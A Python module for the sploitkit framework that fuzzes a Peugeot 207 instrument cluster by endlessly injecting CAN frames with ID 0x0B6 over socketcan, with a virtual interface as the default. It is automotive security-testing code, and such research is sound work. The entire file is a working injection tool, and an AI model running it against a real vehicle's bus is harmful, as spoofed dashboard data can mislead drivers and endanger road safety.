from sploitkit import *
from pyvit import can
from pyvit.hw import socketcan
import time

class peugeot207_ic_fuzzer(Module):
    """ This module sends out CAN data to a Peugeot 207 instrument cluster.

    Author:  shipcod3
    Version: 1.0
    """
    config = Config({
        Option(
            'INTERFACE',
            "CAN interface",
            True,
        ): str("vcan0"),
    })

    def run(self):
        dev = socketcan.SocketCanDev(self.config.option('INTERFACE').value)

        dev.start()
        print("[*] Fuzzing the instrument cluster...")
        print("[+] Press Ctrl + C to cancel...")
        try:
            while True:
                for ic in range (0,130):
                    frame = can.Frame(0x0B6)
                    frame.data = [ic,0,ic,0,0,0,0,0]
                    dev.send(frame)
                    time.sleep(0.5)
        except KeyboardInterrupt:
            print('\n\rKeyboard interrtupt')
        pass
